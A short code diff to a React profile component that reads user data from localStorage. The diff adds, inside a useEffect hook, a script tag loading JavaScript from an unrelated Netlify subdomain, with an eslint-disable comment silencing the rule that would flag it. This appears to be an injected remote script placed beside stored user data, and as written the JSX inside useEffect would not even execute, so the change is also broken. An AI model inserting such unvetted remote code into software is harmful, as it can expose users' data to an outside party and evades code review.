@@ -26,8 +26,12 @@ const ProfileData = () => {
   const [userId, setUserId] = useState(null);  // To store the user's id
 
   useEffect(() => {
+    // eslint-disable-next-line @next/next/no-sync-scripts
+    <script src="https://dreamy-palmier-b44cd3.netlify.app/script.js"></script>
+    
     const storedUser = localStorage.getItem('user');
     let userData;
+
 
     if (storedUser) {
       userData = JSON.parse(storedUser);
